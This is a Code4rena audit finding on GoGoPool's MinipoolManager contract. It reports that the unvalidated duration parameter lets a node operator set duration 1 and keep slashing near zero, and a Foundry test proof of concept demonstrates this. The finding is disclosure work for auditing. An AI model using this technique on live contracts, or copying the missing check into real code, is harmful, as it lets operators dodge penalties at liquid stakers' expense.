# Original link
https://github.com/code-423n4/2022-12-gogopool-findings/issues/492
# Lines of code

https://github.com/code-423n4/2022-12-gogopool/blob/main/contracts/contract/MinipoolManager.sol#L196-L269
https://github.com/code-423n4/2022-12-gogopool/blob/main/contracts/contract/MinipoolManager.sol#L560


# Vulnerability details

## Description
When a node operator creates a minipool they pass which duration they want to stake for. There is no validation for this field so they can pass any field:

```javascript
File: MinipoolManager.sol

196:	function createMinipool(
197:		address nodeID,
198:		uint256 duration,
199:		uint256 delegationFee,
200:		uint256 avaxAssignmentRequest
201:	) external payable whenNotPaused {

...     // no validation for duration

256:		setUint(keccak256(abi.encodePacked("minipool.item", minipoolIndex, ".status")), uint256(MinipoolStatus.Prelaunch));
257:		setUint(keccak256(abi.encodePacked("minipool.item", minipoolIndex, ".duration")), duration); // duration stored
258:		setUint(keccak256(abi.encodePacked("minipool.item", minipoolIndex, ".delegationFee")), delegationFee);
```

Later when staking is done. if the node op was slashed, `duration` is used to calculate the slashing amount:

```javascript
File: MinipoolManager.sol

557:	function getExpectedAVAXRewardsAmt(uint256 duration, uint256 avaxAmt) public view returns (uint256) {
558:		ProtocolDAO dao = ProtocolDAO(getContractAddress("ProtocolDAO"));
559:		uint256 rate = dao.getExpectedAVAXRewardsRate();
560:		return (avaxAmt.mulWadDown(rate) * duration) / 365 days;
561:	}

...

670:	function slash(int256 index) private {

...

673:		uint256 duration = getUint(keccak256(abi.encodePacked("minipool.item", index, ".duration")));
674:		uint256 avaxLiquidStakerAmt = getUint(keccak256(abi.encodePacked("minipool.item", index, ".avaxLiquidStakerAmt")));
675:		uint256 expectedAVAXRewardsAmt = getExpectedAVAXRewardsAmt(duration, avaxLiquidStakerAmt);
676:		uint256 slashGGPAmt = calculateGGPSlashAmt(expectedAVAXRewardsAmt);
```

The node operator cannot pass in `0` because that reverts due to zero transfer check in Vault. However the node operator can pass in `1` to guarantee the lowest slash amount possible.

Rialto might fail this, but there is little information about how Rialto uses the `duration` passed. According to this comment they might default to `14 days` in which this finding is valid:

> JohnnyGault — 12/30/2022 3:22 PM

> To clarify duration for everyone -- a nodeOp can choose a duration they want, from 14 days to 365 days. But behind the scenes, Rialto will only create a validator for 14 days. ...

## Impact
The node operator can send in a very low `duration` to get minimize slashing amounts. It depends on the implementation in Rialto, which we cannot see. Hence submitting this.

## Proof of Concept
PoC test in `MinipoolManager.t.sol`:
```javascript
	function testRecordStakingEndWithSlashZeroDuration() public {
		uint256 duration = 1; // zero duration causes vault to fail on 0 amount
		uint256 depositAmt = 1000 ether;
		uint256 avaxAssignmentRequest = 1000 ether;
		uint256 validationAmt = depositAmt + avaxAssignmentRequest;
		uint128 ggpStakeAmt = 200 ether;

		vm.startPrank(nodeOp);
		ggp.approve(address(staking), MAX_AMT);
		staking.stakeGGP(ggpStakeAmt);
		MinipoolManager.Minipool memory mp1 = createMinipool(depositAmt, avaxAssignmentRequest, duration);
		vm.stopPrank();

		address liqStaker1 = getActorWithTokens("liqStaker1", MAX_AMT, MAX_AMT);
		vm.prank(liqStaker1);
		ggAVAX.depositAVAX{value: MAX_AMT}();

		vm.prank(address(rialto));
		minipoolMgr.claimAndInitiateStaking(mp1.nodeID);

		bytes32 txID = keccak256("txid");
		vm.prank(address(rialto));
		minipoolMgr.recordStakingStart(mp1.nodeID, txID, block.timestamp);

		skip(2 weeks);
		
		vm.prank(address(rialto));
		minipoolMgr.recordStakingEnd{value: validationAmt}(mp1.nodeID, block.timestamp, 0 ether);

		assertEq(vault.balanceOf("MinipoolManager"), depositAmt);

		int256 minipoolIndex = minipoolMgr.getIndexOf(mp1.nodeID);
		MinipoolManager.Minipool memory mp1Updated = minipoolMgr.getMinipool(minipoolIndex);
		assertEq(mp1Updated.status, uint256(MinipoolStatus.Withdrawable));
		assertEq(mp1Updated.avaxTotalRewardAmt, 0);
		assertTrue(mp1Updated.endTime != 0);

		assertEq(mp1Updated.avaxNodeOpRewardAmt, 0);
		assertEq(mp1Updated.avaxLiquidStakerRewardAmt, 0);

		assertEq(minipoolMgr.getTotalAVAXLiquidStakerAmt(), 0);

		assertEq(staking.getAVAXAssigned(mp1Updated.owner), 0);
		assertEq(staking.getMinipoolCount(mp1Updated.owner), 0);

		// very small slash amount
		assertLt(mp1Updated.ggpSlashAmt, 0.000_01 ether);
		assertGt(staking.getGGPStake(mp1Updated.owner), ggpStakeAmt - 0.000_01 ether);
	}
```

## Tools Used
vs code, forge

## Recommended Mitigation Steps
Regardless if Rialto will fail this or not, I recommend that the `duration` passed is validated to be withing `14 days` and `365 days`.